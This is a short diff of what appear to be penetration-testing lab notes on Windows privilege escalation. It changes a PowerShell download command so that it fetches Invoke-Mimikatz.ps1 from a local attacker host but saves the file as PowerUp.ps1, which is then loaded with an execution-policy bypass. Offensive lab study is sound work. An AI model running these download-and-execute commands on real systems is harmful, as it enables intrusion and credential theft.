@@ -17,7 +17,7 @@ shutdown /r /t 0
 
 powerup,ps1
 
-iwr -uri http://192.168.45.186:8000/PowerUp.ps1 -Outfile PowerUp.ps1
+iwr -uri http://192.168.45.186:8000/Invoke-Mimikatz.ps1 -Outfile PowerUp.ps1
 powershell -ep bypass
 . .\PowerUp.ps1
 Get-ModifiableServiceFile
